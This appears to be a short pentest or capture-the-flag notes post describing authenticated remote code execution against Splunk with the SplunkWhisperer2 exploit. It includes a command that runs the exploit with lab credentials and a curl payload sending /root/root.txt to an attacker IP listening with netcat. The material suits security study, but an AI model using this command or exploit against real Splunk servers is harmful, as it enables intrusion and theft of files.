---
layout: post
title: Splunk Wispherer
description: Splunk Wispherer
summary: Splunk Wispherer
tags: [rce,devops]
minute: 1
---
# Overview
Authenticated attacker can send malicuous package to splunk API and execute it. This can be done remotely or locally.

# Using python3 on local exploit
* Convert this [exploit](https://github.com/cnotin/SplunkWhisperer2/blob/master/PySplunkWhisperer2/PySplunkWhisperer2_local.py) into python3

```bash
# replace functions
raw_input() --> input()
print "some text" --> print("some text")
```

* Open netcat listener on attacker machine to receive the output
* Upload exploit to victim machine and run

```bash
python3 PySplunkWhisperer2_local.py --port 8089 --username shaun --password Guitar123 --payload "curl -F 'data=@/root/root.txt' http://10.10.14.26:4444"
```

* Sample execution

![](/spindel/assets/Splunk%20Wispherer/E8F96602-F53E-48EB-9F78-BE72A20830F5.png)

![](/spindel/assets/Splunk%20Wispherer/86A9D789-E1E0-42DB-B3AA-9A22562844E1.png)

# References
* [Abusing Splunk Forwarders For Shells and Persistence · Eapolsniper's Blog](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/)